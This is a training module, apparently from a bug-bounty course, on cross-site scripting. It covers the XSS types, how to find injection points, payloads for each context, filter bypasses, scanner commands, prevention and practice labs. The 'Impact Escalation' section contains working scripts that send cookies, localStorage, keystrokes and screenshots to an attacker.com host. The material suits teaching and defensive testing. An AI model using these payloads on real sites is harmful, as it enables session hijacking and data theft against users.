# ⚡ Module 07: Cross-Site Scripting (XSS)

> **Level:** 🟡 Intermediate | **Time:** ~4 hours | **Prerequisites:** Module 01-06

---

## 📖 Overview

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. It's one of the most prevalent web vulnerabilities and can lead to account takeover, data theft, keylogging, and malware distribution. XSS vulnerabilities are consistently rewarded in bug bounty programs.

---

## ❓ Why It Matters

A stored XSS in a widely-used feature can affect millions of users. Session cookie theft via XSS can result in complete account takeover without needing credentials. Many $5,000-$50,000 bug bounty payouts have been XSS vulnerabilities with high impact.

---

## 🌍 Real-World Example

A researcher found a stored XSS in a social media platform's profile bio field. The payload executed for every user who viewed the profile, stealing their session cookies and sending them to an attacker-controlled server. With 500K+ followers on the test account, this affected massive scale — earning a **$20,000 critical bounty**.

---

## 📋 Step-by-Step Methodology

### Types of XSS

```
Reflected XSS:
    Malicious script → URL parameter → Reflected in response → Executes
    (Not stored, requires user to click malicious link)

Stored XSS:
    Malicious script → Stored in database → Served to all users → Executes
    (Persistent, affects all visitors to the page)

DOM-Based XSS:
    Malicious script → URL fragment → JavaScript reads it → DOM manipulation → Executes
    (Client-side only, doesn't reach server)
```

### Finding XSS Injection Points

```
1. Map all input fields:
   - Search boxes
   - Comment/review forms
   - Username/profile fields
   - URL parameters
   - HTTP headers reflected in page
   - File uploads (filename in response)

2. Test for reflection:
   - Inject unique string: xss-test-abc123
   - Search response for the string
   - Check how it appears in HTML context

3. Determine HTML context:
   - Inside HTML tag content: <p>INPUT</p>
   - Inside attribute: <input value="INPUT">
   - Inside script: <script>var x = 'INPUT'</script>
   - Inside style: <style>color: INPUT</style>
```

### Exploiting Based on Context

```
Context: HTML content
Payload: <script>alert(1)</script>
         <img src=x onerror=alert(1)>

Context: HTML attribute
Payload: "><script>alert(1)</script>
         " onmouseover="alert(1)
         
Context: JavaScript string
Payload: ';alert(1)//
         \';alert(1)//
         
Context: JavaScript variable
Payload: </script><script>alert(1)</script>
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercept, modify, and test XSS |
| **XSStrike** | Advanced XSS scanner |
| **Dalfox** | Fast XSS scanner |
| **Browser DevTools** | Inspect DOM and debug |

---

## 💡 Payload Examples

### Basic Payloads

```javascript
// Classic test
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>

// Without script tags
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>

// Event handlers
<a href="#" onclick=alert(1)>click me</a>
<div onmouseover=alert(1)>hover me</div>
```

### Filter Bypass Payloads

```javascript
// Case variation
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

// Encoding
<script>alert(&#x31;)</script>    // HTML entity
<script>alert(\x31)</script>      // Hex escape
<script>alert(\u0031)</script>    // Unicode

// Breaking keywords
<scr<script>ipt>alert(1)</scr</script>ipt>

// Without parentheses (for CSP bypass)
<script>onerror=alert;throw 1</script>
<img src=x onerror="window['ale'+'rt'](1)">

// Null bytes
<scr\x00ipt>alert(1)</scr\x00ipt>

// JavaScript protocol
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
```

### Impact Escalation

```javascript
// Steal cookies
<script>
    var img = new Image();
    img.src = "https://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);
</script>

// Steal localStorage
<script>
    fetch("https://attacker.com/steal", {
        method: "POST",
        body: JSON.stringify(localStorage)
    });
</script>

// Keylogger
<script>
    document.addEventListener('keypress', function(e) {
        fetch("https://attacker.com/keys?k=" + e.key);
    });
</script>

// Redirect user
<script>window.location = "https://attacker.com/phishing"</script>

// Capture screenshot (using html2canvas)
<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
<script>
    html2canvas(document.body).then(canvas => {
        fetch("https://attacker.com/screenshot", {
            method: "POST",
            body: canvas.toDataURL()
        });
    });
</script>
```

### DOM XSS Payloads

```javascript
// Look for dangerous sinks:
document.write()
document.writeln()
element.innerHTML
element.outerHTML
eval()
setTimeout("string")
setInterval("string")
location.href
jQuery.html()

// Test with:
#<img src=x onerror=alert(1)>          // hash fragment
?x=<script>alert(1)</script>           // URL parameter

// Example vulnerable code:
document.getElementById('content').innerHTML = location.hash.slice(1);
// Payload: https://target.com/page#<img src=x onerror=alert(1)>
```

### XSS via Automated Tools

```bash
# XSStrike
python3 xsstrike.py -u "https://target.com/search?q=test"

# Dalfox
dalfox url "https://target.com/search?q=test"
dalfox url "https://target.com/search?q=test" --remote-payloads portswigger,payloadbox

# Use with file of URLs
cat urls.txt | dalfox pipe

# Manual testing in Burp
# Use Intruder with XSS payload list from:
# /opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt
```

---

## 🛡️ Prevention

| Method | Implementation |
|--------|---------------|
| **Output encoding** | Encode all user input before displaying in HTML |
| **Content Security Policy** | `script-src 'self'` prevents inline scripts |
| **HttpOnly cookies** | Prevents cookie theft via XSS |
| **Input validation** | Whitelist expected input formats |
| **Sanitization library** | Use DOMPurify for HTML sanitization |

```javascript
// WRONG - vulnerable to XSS
element.innerHTML = userInput;
document.write(userInput);

// RIGHT - use textContent for plain text
element.textContent = userInput;

// RIGHT - for HTML, use DOMPurify
element.innerHTML = DOMPurify.sanitize(userInput);

// Server-side encoding examples (Python)
from html import escape
safe_output = escape(user_input)  # Escapes &, <, >, ", '
```

---

## 🧪 Practice Labs

| Lab | Link | Exercise |
|-----|------|---------|
| PortSwigger XSS | [portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting) | 30 progressive XSS labs |
| DVWA XSS | localhost/dvwa | Reflected and Stored XSS |
| Juice Shop | localhost:3000 | DOM and Reflected XSS challenges |
| XSS Game | [xss-game.appspot.com](https://xss-game.appspot.com) | Interactive XSS challenges |

---

## 📚 Additional Reading

- [XSS Payload Collection](./xss-payloads.md) — Comprehensive payload reference
- [CSP Bypass Techniques](./csp-bypass.md) — Advanced XSS exploitation

---

<div align="center">

[← Module 06: Web Application Basics](../06.%20Web%20Application%20Basics/README.md) | [Next Module: Header Injection →](../08.%20Header%20Injection/README.md)

</div>
